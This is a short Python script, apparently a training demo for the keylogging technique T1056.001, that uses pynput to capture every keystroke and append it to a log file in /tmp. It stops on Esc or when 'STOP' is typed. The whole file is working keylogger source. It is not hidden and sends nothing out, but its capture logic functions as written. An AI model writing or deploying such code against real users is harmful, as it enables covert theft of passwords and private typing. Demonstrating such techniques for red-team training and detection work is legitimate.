#!/usr/bin/env python3
"""
T1056.001 – Keylogger Demo (Educational)
Captures keystrokes and logs them to a file.
Uses pynput — requires access to input devices.
"""
from pynput import keyboard
import datetime, signal, sys, os

LOG_FILE = "/tmp/keylog.txt"
captured = []

def on_press(key):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    try:
        char = key.char
        captured.append(f"{char}")
        with open(LOG_FILE, 'a') as f:
            f.write(char)
    except AttributeError:
        special = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n[ENTER]\n',
            keyboard.Key.backspace: '[BS]',
            keyboard.Key.tab: '[TAB]',
        }
        s = special.get(key, f'[{key.name}]')
        captured.append(s)
        with open(LOG_FILE, 'a') as f:
            f.write(s)
    # Stop after capturing "STOP" sequence (for demo)
    if ''.join(captured[-4:]) == 'STOP':
        return False

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def run_keylogger():
    print(f"[*] Keylogger active. Logging to {LOG_FILE}")
    print(f"[*] Type 'STOP' or press Esc to end the demo.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print(f"\n[+] Captured {len(captured)} keystrokes")
    print(f"[+] Log file: {LOG_FILE}")
    if os.path.exists(LOG_FILE):
        print(f"[+] Content: {open(LOG_FILE).read()[:200]}")

if __name__ == '__main__':
    run_keylogger()
